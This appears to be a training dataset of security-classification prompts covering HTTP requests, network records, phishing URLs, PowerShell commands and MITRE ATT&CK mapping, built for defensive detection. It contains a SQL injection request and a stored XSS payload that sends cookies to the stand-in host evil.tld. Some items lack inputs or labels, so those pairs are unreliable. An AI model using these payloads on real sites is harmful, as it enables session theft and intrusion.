instruction: Classify the following HTTP request as benign or malicious, and identify the attack class if malicious.
input:
GET /index.php?id=1' OR '1'='1 HTTP/1.1
Host: example.com
User-Agent: sqlmap/1.7
output: malicious — SQL injection (boolean-based, sqlmap fingerprint in User-Agent)

instruction: Classify the following HTTP request as benign or malicious, and identify the attack class if malicious.
input:
GET /search?q=javascript HTTP/1.1
Host: docs.example.com
User-Agent: Mozilla/5.0

instruction: Classify the following HTTP request as benign or malicious, and identify the attack class if malicious.
input:
POST /comment HTTP/1.1
Host: blog.example.com
Content-Type: application/x-www-form-urlencoded

body=<script>fetch('https://evil.tld/c?'+document.cookie)</script>
output: malicious — stored XSS attempting to exfiltrate cookies

instruction: Classify this network connection record as benign or assign the attack family it most resembles.
input: protocol=tcp | service=http | flag=S0 | src_bytes=0 | dst_bytes=0 | duration=0 | count=511
output: DoS — neptune (SYN flood pattern, S0 flag with high count)

instruction: Classify this network connection record as benign or assign the attack family it most resembles.
input: protocol=tcp | service=http | flag=SF | src_bytes=215 | dst_bytes=45076 | duration=0 | count=8

instruction: Classify this network connection record as benign or assign the attack family it most resembles.
input: protocol=tcp | service=private | flag=REJ | src_bytes=0 | dst_bytes=0 | duration=0 | count=119
output: Probe — portsweep (high REJ count across services)

instruction: Decide if this URL is a phishing attempt and explain the indicators.
output: phishing — typosquatted domain (paypa1 vs paypal), suspicious subdomain prefix, urgency in path

instruction: Decide if this URL is a phishing attempt and explain the indicators.
output: benign — apex domain matches the legitimate brand and path is on-product

instruction: Given this PowerShell command, decide if it is suspicious and explain why.
output: suspicious — hidden window, NoProfile, and base64-encoded payload are classic LOLBin/empire indicators

instruction: Given this PowerShell command, decide if it is suspicious and explain why.
output: benign — read-only service enumeration, common admin task

instruction: Identify the MITRE ATT&CK technique that best describes the observed activity.
input: Adversary dumped LSASS memory using procdump.exe to extract credentials.
output: T1003.001 — OS Credential Dumping: LSASS Memory

instruction: Identify the MITRE ATT&CK technique that best describes the observed activity.
input: A new scheduled task was created via schtasks.exe that runs a script at user logon.
output: T1053.005 — Scheduled Task/Job: Scheduled Task (also Persistence via T1547 if at logon)
